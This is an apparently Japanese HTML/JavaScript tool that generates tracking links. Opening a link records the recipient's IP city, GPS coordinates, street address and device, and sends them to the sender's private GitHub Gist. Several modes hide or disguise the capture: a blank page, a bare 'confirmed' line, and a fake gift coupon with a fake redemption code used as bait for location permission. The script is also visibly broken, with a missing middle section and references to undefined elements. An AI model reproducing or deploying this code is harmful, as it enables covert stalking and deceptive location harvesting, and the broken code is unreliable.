<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{margin:0;padding:0;}
body{background:#0e1116;color:#e6e8eb;font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP",sans-serif;font-size:14px;line-height:1.6;padding:16px 14px calc(84px + env(safe-area-inset-bottom));}
.hidden{display:none!important;}
.ttl{font-size:19px;font-weight:800;}
.sub{font-size:11.5px;color:#8b93a0;margin:2px 0 14px;}
.tabs{position:fixed;left:0;right:0;bottom:0;display:flex;background:#12161c;border-top:1px solid #1f242e;padding-bottom:env(safe-area-inset-bottom);z-index:60;}
.tabs button{flex:1;background:none;border:0;color:#8b93a0;font-weight:700;font-size:12.5px;padding:15px 0;font-family:inherit;}
.tabs button.on{color:#60a5fa;}
.card{background:#151a21;border:1px solid #1f242e;border-radius:14px;padding:14px;margin-bottom:12px;}
label{display:block;font-size:11.5px;color:#8b93a0;margin:12px 0 5px;}
label:first-child{margin-top:0;}
input,select,textarea{width:100%;background:#0d1117;border:1px solid #2a313c;color:#fff;border-radius:10px;padding:11px;font-size:16px;font-family:inherit;}
textarea{min-height:74px;font-size:13px;line-height:1.65;}
button{border:0;border-radius:10px;padding:12px 14px;font-size:13px;font-weight:700;font-family:inherit;background:#232a34;color:#dfe4ea;}
button.pri{background:#1d4ed8;color:#fff;}
button.dang{background:#3a1010;color:#f87171;}
button.sm{padding:9px 10px;font-size:11.5px;}
.row{display:flex;gap:8px;margin-top:10px;}
.row.wrap{flex-wrap:wrap;}
.row>button{flex:1;min-width:0;}
.chk{display:flex;align-items:center;gap:9px;font-size:13px;color:#dfe4ea;margin:14px 0 0;font-weight:400;}
.chk input{width:auto;padding:0;margin:0;transform:scale(1.15);}
.link{background:#0a0d12;border:1px solid #1f242e;border-radius:10px;padding:10px;font-size:11.5px;word-break:break-all;color:#93c5fd;line-height:1.5;}
.muted{font-size:11.5px;color:#8b93a0;margin-top:8px;}
.h2{font-size:13px;font-weight:800;margin-bottom:8px;}
.hit{background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;}
.hit .a{font-size:12.5px;color:#fff;font-weight:700;}
.hit .m{display:flex;gap:9px;flex-wrap:wrap;font-size:10.5px;color:#8b93a0;margin-top:4px;}
.tag{font-weight:800;padding:2px 7px;border-radius:99px;}
.tg{background:#06331a;color:#4ade80;}
.tb{background:#0d2340;color:#60a5fa;}
.geo{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#60a5fa;margin-top:7px;cursor:pointer;word-break:break-all;}
.geo:active{opacity:.6;}
#resMap{height:210px;border-radius:10px;margin-top:10px;overflow:hidden;background:#0a0d12;}
.hitem{display:flex;justify-content:space-between;align-items:center;gap:8px;background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;cursor:pointer;}
.hitem .n{font-size:12.5px;color:#fff;font-weight:700;}
.hitem .d{font-size:10.5px;color:#8b93a0;}
.hitem .go{flex:0 0 auto;font-size:11px;color:#60a5fa;font-weight:800;padding:6px 2px 6px 8px;}
.hitem .del{flex:0 0 auto;font-size:11px;color:#8b93a0;font-weight:700;background:#1b2129;border-radius:8px;padding:8px 11px;}
ol{padding-left:20px;margin:6px 0;font-size:12px;color:#a8b0bb;line-height:1.9;}
code{background:#0a0d12;border-radius:4px;padding:1px 5px;font-size:11px;color:#93c5fd;}
</style>
</head>
<body>
<div id="app"></div>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
(function(){
"use strict";

/* ===================== 基本 ===================== */
var $ = function(id){ return document.getElementById(id); };
var hp = new URLSearchParams(location.hash.replace(/^#/,""));
var TOKEN = hp.get("t") || localStorage.getItem("loclink_tok") || "";
if (hp.get("t")) localStorage.setItem("loclink_tok", hp.get("t"));
var GH = "https://api.github.com/gists";
var NAME = hp.get("n") || "";
var RID  = (hp.get("r") || "").replace(/^gh/,"");
var V    = hp.get("v") || "";
var GF   = hp.get("g") || "";
var BASE = location.origin + location.pathname;
var HIST = "loclink_hist";
var VID  = Date.now().toString(36) + Math.random().toString(36).slice(2,7);
var isLine = /Line\//i.test(navigator.userAgent);

function esc(s){ return String(s==null?"":s).replace(/[&<>"]/g,function(m){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[m];}); }
function req(method,url,headers,body,raw){
  return new Promise(function(res,rej){
    var x = new XMLHttpRequest(); x.open(method,url,true); x.timeout = 20000;
    Object.keys(headers||{}).forEach(function(k){ x.setRequestHeader(k,headers[k]); });
    x.onload  = function(){ res({ok:x.status>=200&&x.status<300, status:x.status, text:x.responseText}); };
    x.onerror = function(){ rej(new Error("network")); };
    x.ontimeout = function(){ rej(new Error("timeout")); };
    x.send(body ? (raw ? body : JSON.stringify(body)) : null);
  });
}
function gh(h){ var o = {"Content-Type":"application/json"}; if(TOKEN) o["Authorization"] = "Bearer " + TOKEN; return Object.assign(o, h||{}); }
function fix(hi){ return new Promise(function(res,rej){ navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:hi,timeout:hi?15000:6000,maximumAge:0}); }); }
function rev(lat,lon){
  return req("GET","https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat="+lat+"&lon="+lon+"&accept-language=ja")
    .then(function(r){ var j = JSON.parse(r.text); return j.display_name || ""; }).catch(function(){ return ""; });
}
function ipOnly(){
  return req("GET","https://ipwho.is/").then(function(r){
    var j = JSON.parse(r.text); if(j && j.city) return (j.region? j.region+" " : "") + j.city; return "";
  }).catch(function(){
    return req("GET","https://ipapi.co/json/").then(function(r){
      var j = JSON.parse(r.text); return (j.region? j.region+" " : "") + (j.city||"");
    }).catch(function(){ return ""; });
  });
}
function devName(){
  var ua = navigator.userAgent;
  var os = /iPhone|iPad/.test(ua) ? "iPhone" : (/Android/.test(ua) ? "Android" : "PC");
  var br = /Line\//i.test(ua) ? "LINE内" : (/CriOS|Chrome/.test(ua) ? "Chrome" : (/Safari/.test(ua) ? "Safari" : "その他"));
  return os + " / " + br;
}
function dist(a,b,c,d){
  var R=6371000, t=function(x){ return x*Math.PI/180; };
  var dLat=t(c-a), dLon=t(d-b);
  var s=Math.sin(dLat/2)*Math.sin(dLat/2)+Math.cos(t(a))*Math.cos(t(c))*Math.sin(dLon/2)*Math.sin(dLon/2);
  return 2*R*Math.asin(Math.sqrt(s));
}
function typeJP(t){
  if(!t) return "お店";
  var m={cafe:"カフェ",restaurant:"飲食店",fast_food:"ファストフード",bakery:"パン屋",bar:"バー",pub:"居酒屋",convenience:"コンビニ",supermarket:"スーパー",greengrocer:"青果店"};
  return m[t.amenity] || m[t.shop] || "お店";
}
function shopsNear(lat, lon){
  var q = '[out:json][timeout:12];('
    + 'node(around:600,'+lat+','+lon+')[amenity~"^(cafe|restaurant|fast_food|bakery|bar|pub)$"];'
    + 'node(around:600,'+lat+','+lon+')[shop~"^(convenience|supermarket|bakery|greengrocer)$"];'
    + ');out center 20;';
  var body = "data=" + encodeURIComponent(q);
  var hdr = {"Content-Type":"application/x-www-form-urlencoded"};
  return req("POST","https://overpass-api.de/api/interpreter",hdr,body,true)
    .catch(function(){ return req("POST","https://overpass.kumi.systems/api/interpreter",hdr,body,true); })
    .then(function(r){
      var j = JSON.parse(r.text);
      return (j.elements||[]).map(function(e){
        return { name:(e.tags && e.tags.name) || typeJP(e.tags), d: Math.round(dist(lat,lon,e.lat,e.lon)) };
      }).sort(function(a,b){ return a.d-b.d; }).slice(0,6);
    });
}
function geoText(lat, lon){ return (Math.round(lat*1e5)/1e5) + ", " + (Math.round(lon*1e5)/1e5); }
function openMaps(lat, lon){ location.href = "https://maps.google.com/?q=" + lat + "," + lon; }

/* ===================== Gist ===================== */
function createGist(){
  return req("POST", GH, gh(), { description:"loclink", public:false, files:{ "hits.json":{content:"[]"} } })
    .then(function(r){ if(!r.ok) throw new Error("HTTP "+r.status); var j = JSON.parse(r.text); return j.id; });
}
function readGist(id){
  return req("GET", GH+"/"+id, gh()).then(function(r){
    if(!r.ok) throw new Error("HTTP "+r.status);
    var j = JSON.parse(r.text), hits = [], loc = null;
    try{ hits = JSON.parse((j.files["hits.json"] && j.files["hits.json"].content) || "[]"); }catch(e){ hits = []; }
    try{ loc = JSON.parse((j.files["loc.json"] && j.files["loc.json"].content) || "null"); }catch(e){ loc = null; }
    if(!Array.isArray(hits)) hits = [];
    var last = null;
    for(var i = hits.length-1; i >= 0; i--){ if(hits[i].gps){ last = hits[i]; break; } }
    if(!last) last = hits.length ? hits[hits.length-1] : loc;
    return { hits:hits, last:last };
  });
}
function record(id, p){
  if(!id || !TOKEN) return Promise.resolve();
  return req("GET", GH+"/"+id, gh()).then(function(r){
    var j = {}; try{ j = JSON.parse(r.text); }catch(e){}
    var arr = [];
    try{ arr = JSON.parse((j.files && j.files["hits.json"] && j.files["hits.json"].content) || "[]"); }catch(e){ arr = []; }
    if(!Array.isArray(arr)) arr = [];
    var hit = Object.assign({ ts:Date.now(), vid:VID, name:NAME, dev:devName() }, p);
    var last = arr[arr.length-1];
    if(last && last.vid === VID) arr[arr.length-1] = hit;
    else arr.push(hit);
    if(arr.length > 300) arr = arr.slice(-300);
    var b = { files:{} }; b.files["hits.json"] = { content: JSON.stringify(arr) };
    return req("PATCH", GH+"/"+id, gh(), b);
  }).catch(function(){});
}
function stopGist(id){ return req("DELETE", GH+"/"+id, gh()); }

/* ===================== 履歴 ===================== */
function getHist(){ try{ return JSON.parse(localStorage.getItem(HIST) || "[]"); }catch(e){ return []; } }
function setHist(a){ try{ localStorage.setItem(HIST, JSON.stringify(a.slice(0,80))); }catch(e){} }
function fmtDT(ts){
  var d = new Date(ts);
  if(!ts || isNaN(d.getTime())) return "日付なし";
  var p = function(n){ return ("0"+n).slice(-2); };
  return (d.getMonth()+1)+"/"+d.getDate()+" "+p(d.getHours())+":"+p(d.getMinutes());
}
function modeLabel(m){ return ({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実","gift":"ギフト" }[m] || "ふつう"); }

/* ===================== 地図（壊れにくく） ===================== */
var maps = {};
function ensureLeaflet(cb){
  if(typeof L !== "undefined"){ cb(true); return; }
  var s = document.createElement("script");
  s.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
  s.onload = function(){ cb(typeof L !== "undefined"); };
  s.onerror = function(){ cb(false); };
  document.head.appendChild(s);
}
function drawMap(elId, lat, lon, dark){
  var el = $(elId);
  if(!el) return;
  el.style.display = "block";
  ensureLeaflet(function(ok){
    if(!ok){
      el.innerHTML = '<div style="display:flex;height:100%;align-items:center;justify-content:center;color:#8b93a0;font-size:11.5px;">地図を読み込めませんでした</div>';
      return;
    }
    var m = maps[elId];
    if(m && m.getContainer() !== el){ try{ m.remove(); }catch(e){} m = null; maps[elId] = null; }
    if(!m){
      try{ m = L.map(el, {zoomControl:false, attributionControl:false}); }
      catch(e){ el.innerHTML = ""; m = L.map(el, {zoomControl:false, attributionControl:false}); }
      maps[elId] = m;
    }
    var url = dark ? "https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
                   : "https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png";
    if(!m.__tiles){ m.__tiles = L.tileLayer(url,{maxZoom:19}).addTo(m); } else { m.__tiles.setUrl(url); }
    m.setView([lat,lon], 16);
    if(m.__mk) m.removeLayer(m.__mk);
    m.__mk = L.marker([lat,lon]).addTo(m);
    [0, 150, 400, 800].forEach(function(t){ setTimeout(function(){ try{ m.invalidateSize(); }catch(e){} }, t); });
  });
}

/* =====================================================================
   受信側
   ===================================================================== */
if(RID){
  var S = { lat:null, lon:null, addr:"", acc:null, ip:"", gps:false };

  function report(){ return record(RID, { lat:S.lat, lon:S.lon, addr:S.addr, acc:S.acc, gps:S.gps, city:S.ip }); }

  function applyFix(p){
    var a = Math.round(p.coords.accuracy);
    if(S.acc !== null && a >= S.acc) return Promise.resolve(false);
    S.lat = p.coords.latitude; S.lon = p.coords.longitude; S.acc = a; S.gps = true;
    return rev(S.lat,S.lon).then(function(x){ S.addr = x; return report().then(function(){ return true; }); });
  }

  function capture(fast){
    return ipOnly().then(function(c){
      S.ip = c;
      if(!GF || !navigator.geolocation) return report();
      var first  = fast ? fix(false) : fix(true);
      var second = fast ? fix(true)  : fix(false);
      return first.then(applyFix).catch(function(){}).then(function(){
        return second.then(applyFix).catch(function(){});
      }).then(function(){ if(!S.gps) return report(); });
    });
  }

  function normalView(){
    $("app").innerHTML =
      '<div class="card" style="margin-top:8px;">'
      + '<div id="rcIcon" style="font-size:26px;margin-bottom:6px;">📍</div>'
      + '<div id="rcTtl" style="font-size:16px;font-weight:800;margin-bottom:6px;">特定しています…</div>'
      + '<div id="rcAddr" style="font-size:13.5px;color:#dfe4ea;line-height:1.7;"></div>'
      + '<div id="rcMeta" class="muted"></div>'
      + '<div class="geo hidden" id="rcGeo"></div>'
      + '<div id="rcMap" style="height:200px;border-radius:10px;margin-top:10px;overflow:hidden;background:#0a0d12;"></div>'
      + '<div class="row"><button id="rcMore" class="hidden">もっと正確にする</button></div>'
      + '<div class="muted" id="rcBack" style="text-align:center;padding-top:12px;">← アプリに戻る</div>'
      + '</div>';
    $("rcBack").onclick = function(){ location.href = BASE; };
    $("rcGeo").onclick = function(){ if(S.lat) openMaps(S.lat, S.lon); };

    capture(false).then(function(){
      $("rcIcon").textContent = "✅";
      $("rcTtl").textContent = "特定しました";
      $("rcAddr").textContent = S.addr || S.ip || "";
      $("rcMeta").textContent = (S.gps ? "GPS 精度 ±"+S.acc+"m" : "IP（市レベル）") + (NAME ? " ／ " + NAME + "さんからのリンク" : "");
      if(S.lat){
        $("rcGeo").textContent = "📍 " + geoText(S.lat, S.lon) + "（タップで地図アプリ）";
        $("rcGeo").classList.remove("hidden");
        drawMap("rcMap", S.lat, S.lon, true);
      }
      if(!S.gps && navigator.geolocation){
        $("rcMore").classList.remove("hidden");
        $("rcMore").onclick = function(){
          $("rcMore").textContent = "取得中…";
          fix(true).then(applyFix).then(function(ok){
            if(ok){
              $("rcAddr").textContent = S.addr; $("rcMeta").textContent = "GPS 精度 ±"+S.acc+"m";
              $("rcGeo").textContent = "📍 " + geoText(S.lat, S.lon) + "（タップで地図アプリ）";
              $("rcGeo").classList.remove("hidden");
              drawMap("rcMap", S.lat, S.lon, true);
            }
            $("rcMore").classList.add("hidden");
          }).catch(function(){ $("rcMore").textContent = "取得できませんでした"; });
        };
      }
    });
  }

  function minView(){
    document.body.style.background = "#fff";
    document.body.style.color = "#111";
    document.body.style.padding = "0";
    var d = document.createElement("div");
    d.setAttribute("style","padding:11px 13px;font-size:11px;color:#9aa0a6;cursor:pointer;-webkit-text-size-adjust:100%;");
    d.textContent = "✓ 確認しました";
    document.body.appendChild(d);
    var open = false;
    d.onclick = function(){
      open = !open;
      if(open){
        if(!$("mnBox")){
          var b = document.createElement("div");
          b.id = "mnBox";
          b.setAttribute("style","margin:0 13px;padding:12px;background:#fff;border:1px solid #eee;border-radius:12px;font-size:12.5px;color:#333;");
          b.innerHTML = '<div id="mnAddr" style="line-height:1.7;"></div><div id="mnMeta" style="font-size:10.5px;color:#aaa;margin-top:6px;"></div>';
          document.body.appendChild(b);
        }
        $("mnBox").classList.remove("hidden");
        $("mnAddr").textContent = S.addr || S.ip || "取得中…";
        capture(true).then(function(){
          $("mnAddr").textContent = S.addr || S.ip || "取得できませんでした";
          $("mnMeta").textContent = (S.gps ? "GPS ±"+S.acc+"m ／ " + geoText(S.lat,S.lon) : "IP（市レベル）");
        });
      } else if($("mnBox")) $("mnBox").classList.add("hidden");
    };
    capture(true);
  }

  function goView(){
    var ov = document.createElement("div");
    ov.setAttribute("style","position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:#fff;color:#111;"
      + "-webkit-text-size-adjust:100%;display:flex;align-items:center;justify-content:center;padding:26px;");
    document.body.style.padding = "0";
    document.body.appendChild(ov);
    var st = "ask";

    function paint(){
      var h = "";
      if(st === "ask"){
        h = '<div style="text-align:center;max-width:400px;width:100%;">'
          + '<div style="font-size:32px;line-height:1;margin-bottom:14px;">📍</div>'
          + '<div style="font-size:19px;font-weight:800;margin-bottom:10px;">正確な現在地を特定します</div>'
          + '<div style="font-size:13.5px;line-height:1.85;color:#555;">位置情報の使用を<b>「許可」</b>してください。<br>市レベルから番地レベルまで精度が上がります。</div>'
          + '<button id="goBtn" style="margin-top:24px;width:100%;padding:17px;border-radius:14px;background:#1d4ed8;color:#fff;font-size:16px;font-weight:800;">許可する</button>'
          + '<div style="font-size:11px;color:#9aa0a6;margin-top:10px;">1タップで終わります</div>'
          + (S.ip ? '<div style="font-size:11.5px;color:#9aa0a6;margin-top:18px;">いまの精度：'+esc(S.ip)+'（市レベル）</div>' : "")
          + (isLine ? '<div style="font-size:11px;color:#9aa0a6;margin-top:14px;line-height:1.6;">LINE内ブラウザです。取れない時は右上の ⋯ から「ブラウザで開く」を選んでください。</div>' : "")
          + '</div>';
      } else if(st === "busy"){
        h = '<div style="text-align:center;">'
          + '<div style="font-size:32px;margin-bottom:14px;">📡</div>'
          + '<div style="font-size:17px;font-weight:800;margin-bottom:8px;">衛星を探しています…</div>'
          + '<div style="font-size:12.5px;color:#888;">'+(S.acc ? "精度 ±"+S.acc+"m" : "そのままお待ちください")+'</div></div>';
      } else if(st === "done"){
        h = '<div style="text-align:center;max-width:400px;width:100%;">'
          + '<div style="font-size:32px;margin-bottom:12px;">✅</div>'
          + '<div style="font-size:17px;font-weight:800;margin-bottom:10px;">特定しました</div>'
          + '<div style="font-size:13.5px;line-height:1.7;color:#333;">'+esc(S.addr||"")+'</div>'
          + '<div style="font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#7c8797;margin-top:8px;">'+geoText(S.lat||0,S.lon||0)+'</div>'
          + (S.acc ? '<div style="font-size:11.5px;color:#9aa0a6;margin-top:8px;">精度 ±'+S.acc+'m</div>' : "")
          + '</div>';
      } else {
        h = '<div style="text-align:center;max-width:400px;width:100%;">'
          + '<div style="font-size:32px;margin-bottom:12px;">⚠️</div>'
          + '<div style="font-size:17px;font-weight:800;margin-bottom:10px;">位置情報がオフです</div>'
          + '<div style="font-size:13px;line-height:1.8;color:#555;">設定 → Safari → 位置情報 → このサイト を「許可」に変えてください。</div>'
          + '<button id="goBtn" style="margin-top:20px;width:100%;padding:15px;border-radius:13px;background:#111;color:#fff;font-size:15px;font-weight:800;">もう一度試す</button>'
          + (S.ip ? '<div style="font-size:11.5px;color:#9aa0a6;margin-top:16px;">いまの精度：'+esc(S.ip)+'（市レベル）</div>' : "")
          + '</div>';
      }
      ov.innerHTML = h;
      if($("goBtn")) $("goBtn").onclick = start;
    }

    function start(){
      st = "busy"; paint();
      var got = false;
      var on = function(p){ got = true; return applyFix(p).then(function(ok){ if(ok) st = "done"; paint(); }); };
      var err = function(e){ if((e && e.code === 1) || !got){ st = "denied"; paint(); report(); } };
      fix(false).then(on).catch(err);
      fix(true).then(on).catch(err);
    }

    paint();
    ipOnly().then(function(c){ S.ip = c; if(st === "ask") paint(); });
    if(navigator.permissions && navigator.permissions.query){
      navigator.permissions.query({name:"geolocation"}).then(function(ps){
        if(ps.state === "granted") start();
        else if(ps.state === "denied"){ st = "denied"; paint(); report(); }
        ps.onchange = function(){ if(ps.state === "granted" && st !== "done" && st !== "busy") start(); };
      }).catch(function(){});
    }
  }

  /* ---- ギフトモード ---- */
  function giftView(){
    var GIFT = hp.get("gi") || "500円クーポン";
    var EX = parseInt(hp.get("x") || "0", 10);
    var CODE = "GIFT-" + (RID.slice(0,4) || "0000").toUpperCase();
    var SHOPS = null, st = "offer";

    var ov = document.createElement("div");
    ov.setAttribute("style","position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:#f6f4fb;color:#1a1a22;"
      + "-webkit-text-size-adjust:100%;display:flex;align-items:center;justify-content:center;padding:22px 18px;overflow-y:auto;box-sizing:border-box;");
    document.body.style.padding = "0";
    document.body.appendChild(ov);

    function leftTxt(){
      if(!EX) return "まもなく失効";
      var ms = EX - Date.now();
      if(ms <= 0) return "まもなく失効";
      return "あと" + Math.ceil(ms/3600000) + "時間で失効";
    }
    function shell(inner){
      return '<div style="max-width:400px;width:100%;">'
        + '<div style="background:#5b21b6;color:#fff;border-radius:15px 15px 0 0;padding:10px 16px;font-size:10.5px;font-weight:800;letter-spacing:.16em;">GIFT</div>'
        + '<div style="background:#fff;border-radius:0 0 15px 15px;padding:22px 18px;box-shadow:0 10px 30px rgba(60,40,120,.15);">'
        + inner + '</div></div>';
    }
    function shopRows(){
      if(SHOPS === null) return '<div style="font-size:11.5px;color:#9a93ad;text-align:center;padding:10px 0;">—</div>';
      if(!SHOPS.length) return '<div style="font-size:11.5px;color:#9a93ad;text-align:center;padding:10px 0;">近くのお店は見つかりませんでした</div>';
      return SHOPS.map(function(s){
        return '<div style="display:flex;justify-content:space-between;gap:8px;padding:7px 0;border-bottom:1px solid #f0eef6;font-size:12px;">'
          + '<span style="min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">'+esc(s.name)+'</span>'
          + '<em style="font-style:normal;color:#8b7fb8;font-size:11px;flex:0 0 auto;">'+s.d+'m</em></div>';
      }).join("");
    }

    function paint(){
      var h = "";
      if(st === "offer"){
        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:14px;">🎁</div>'
          + '<div style="font-size:16px;font-weight:800;text-align:center;line-height:1.65;">'
          + (NAME ? esc(NAME)+'さんから<br>' : "") + 'ギフトが届きました</div>'
          + '<div style="margin:18px 0;border:1.5px dashed #c4b5fd;border-radius:12px;padding:16px;text-align:center;background:#faf8ff;">'
          + '<div style="font-size:18px;font-weight:800;color:#5b21b6;">'+esc(GIFT)+'</div>'
          + '<div style="font-size:11px;color:#8b7fb8;margin-top:6px;">'+leftTxt()+'</div></div>'
          + '<div style="font-size:13px;color:#555;line-height:1.85;text-align:center;">お受け取りには、<br>近くのお店を調べます</div>'
          + '<button id="gBtn" style="margin-top:18px;width:100%;padding:17px;border-radius:13px;background:#5b21b6;color:#fff;font-size:16.5px;font-weight:800;">受け取る</button>'
          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;line-height:1.6;">'
          + (S.ip ? '現在のエリア：'+esc(S.ip)+'<br>' : "")
          + '「許可」を押すと近くのお店を探せます</div>';
      } else if(st === "busy"){
        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:14px;">🔎</div>'
          + '<div style="font-size:16px;font-weight:800;text-align:center;line-height:1.65;">近くのお店を<br>調べています…</div>'
          + '<div style="margin-top:18px;">'+shopRows()+'</div>'
          + '<div style="font-size:11.5px;color:#9a93ad;text-align:center;margin-top:14px;">位置情報の使用を「許可」してください</div>';
      } else if(st === "done"){
        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:12px;">✅</div>'
          + '<div style="font-size:16px;font-weight:800;text-align:center;">受け取りました</div>'
          + (S.addr ? '<div style="font-size:11px;color:#8b7fb8;text-align:center;margin-top:6px;">'+esc(S.addr)+'</div>' : "")
          + (S.lat ? '<div style="font-family:ui-monospace,Menlo,monospace;font-size:10.5px;color:#a99fc4;text-align:center;margin-top:4px;">'+geoText(S.lat,S.lon)+'</div>' : "")
          + '<div style="margin-top:16px;">'
          + '<div style="font-size:11px;font-weight:800;color:#5b21b6;margin-bottom:6px;">'
          + (SHOPS && SHOPS.length ? '近くのお店 '+SHOPS.length+'件' : '近くのお店')+'</div>'
          + shopRows() + '</div>'
          + '<div style="margin-top:14px;background:#f4f1fb;border-radius:11px;padding:12px;text-align:center;">'
          + '<div style="font-size:10.5px;color:#8b7fb8;margin-bottom:4px;">ギフト番号</div>'
          + '<div style="font-size:15px;font-weight:800;letter-spacing:.12em;color:#5b21b6;">'+CODE+'</div></div>'
          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;">レジでこの番号を伝えてください</div>';
      } else {
        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:12px;">⚠️</div>'
          + '<div style="font-size:16px;font-weight:800;text-align:center;">お店を調べるには<br>位置情報が必要です</div>'
          + '<div style="font-size:12.5px;color:#555;line-height:1.85;text-align:center;margin-top:12px;">設定 → Safari → 位置情報 → このサイト を「許可」に変えてください。</div>'
          + '<button id="gBtn" style="margin-top:18px;width:100%;padding:16px;border-radius:13px;background:#5b21b6;color:#fff;font-size:15.5px;font-weight:800;">もう一度試す</button>'
          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;">ギフト番号 '+CODE+' は有効です</div>';
      }
      ov.innerHTML = shell(h);
      if($("gBtn")) $("gBtn").onclick = start;
    }

    function loadShops(){
      if(!S.lat){ SHOPS = []; paint(); return; }
      shopsNear(S.lat, S.lon).then(function(l){ SHOPS = l; paint(); }).catch(function(){ SHOPS = []; paint(); });
    }
    function start(){
      st = "busy"; paint();
      var got = false;
      var on = function(p){ got = true; return applyFix(p).then(function(ok){ if(ok){ st = "done"; paint(); loadShops(); } }); };
      var err = function(e){ if((e && e.code === 1) || !got){ st = "denied"; paint(); report(); } };
      fix(false).then(on).catch(err);
      fix(true).then(on).catch(err);
    }

    paint();
    ipOnly().then(function(c){ S.ip = c; if(st === "offer") paint(); });
    if(navigator.permissions && navigator.permissions.query){
      navigator.permissions.query({name:"geolocation"}).then(function(ps){
        if(ps.state === "granted") start();
        ps.onchange = function(){ if(ps.state === "granted" && st === "offer") start(); };
      }).catch(function(){});
    }
  }

  if(V === "blank"){ document.body.style.background = "#fff"; document.body.style.padding = "0"; capture(true); }
  else if(V === "min"){ minView(); }
  else if(V === "go"){ goView(); }
  else if(V === "gift"){ giftView(); }
  else { normalView(); }

  return;
}

      }
      var gpsN = (d.hits||[]).filter(function(x){ return x.gps; }).length;
      $("resNote").textContent = (d.hits||[]).length ? "記録 "+(d.hits||[]).length+"件（うちGPS "+gpsN+"件）。表示は最新のGPS記録です。" : "";
      if(d.last.lat) drawMap("resMap", d.last.lat, d.last.lon, true);
    }
    var hits = d.hits || [];
    $("hitsCard").classList.toggle("hidden", !hits.length);
    $("hitsN").textContent = hits.length ? "全 "+hits.length+"件" : "";
    $("hitsList").innerHTML = hits.slice().reverse().map(function(x){
      return '<div class="hit"><div class="a">'+esc(x.addr || x.city || "—")+'</div>'
        + (x.lat ? '<div class="geo" style="margin-top:3px;">'+geoText(x.lat,x.lon)+'</div>' : "")
        + '<div class="m"><span class="tag '+(x.gps ? "tg" : "tb")+'">'+(x.gps ? "GPS ±"+(x.acc||"?")+"m" : "IP")+'</span>'
        + '<span>'+fmtDT(x.ts)+'</span><span>'+esc(x.dev||"")+'</span></div></div>';
    }).join("");
  }).catch(function(){ $("resEmpty").textContent = "読み込みに失敗しました。トークンを確認してください。"; });
}
$("btnReload").onclick = refreshRes;
$("btnResCopy").onclick = function(){
  copy(($("resAddr").textContent || "") + "\n" + ($("resGeo").textContent || "") + "\n" + ($("resMeta").textContent || ""));
  $("btnResCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnResCopy").textContent = "結果をコピー"; }, 1400);
};
$("btnCsv").onclick = function(){
  if(!CUR) return;
  readGist(CUR.id).then(function(d){
    var rows = [["日時","名前","住所","緯度","経度","精度","種類","端末"]];
    (d.hits||[]).forEach(function(x){
      rows.push([new Date(x.ts).toLocaleString("ja-JP"), x.name||"", x.addr||x.city||"", x.lat||"", x.lon||"", x.acc||"", x.gps?"GPS":"IP", x.dev||""]);
    });
    var csv = "\ufeff" + rows.map(function(r){ return r.map(function(c){ return '"'+String(c).replace(/"/g,'""')+'"'; }).join(","); }).join("\r\n");
    var a = document.createElement("a");
    a.href = URL.createObjectURL(new Blob([csv],{type:"text/csv"}));
    a.download = "hits_" + Date.now() + ".csv";
    document.body.appendChild(a); a.click(); a.remove();
  });
};
function startPoll(){ stopPoll(); pollTimer = setInterval(function(){ if(document.visibilityState === "visible") refreshRes(); }, 15000); }
function stopPoll(){ if(pollTimer){ clearInterval(pollTimer); pollTimer = null; } }

$("btnTokSave").onclick = function(){
  var v = $("inTok").value.trim();
  if(!v){ $("tokMsg").textContent = "空です"; return; }
  localStorage.setItem("loclink_tok", v); TOKEN = v;
  $("tokMsg").textContent = "保存しました。";
};
$("btnTokTest").onclick = function(){
  var v = $("inTok").value.trim() || TOKEN;
  if(!v){ $("tokMsg").textContent = "トークンがありません"; return; }
  $("tokMsg").textContent = "確認中…";
  req("GET","https://api.github.com/user",{"Content-Type":"application/json","Authorization":"Bearer "+v})
    .then(function(r){
      if(r.ok){ var j = JSON.parse(r.text); $("tokMsg").textContent = "OK：" + j.login; }
      else $("tokMsg").textContent = "失敗 HTTP " + r.status;
    }).catch(function(){ $("tokMsg").textContent = "通信エラー"; });
};

renderHist();
if(!TOKEN) document.querySelector('[data-t="set"]').click();
if(getHist().length) CUR = getHist()[0];
})();
</script>
</body>
</html>
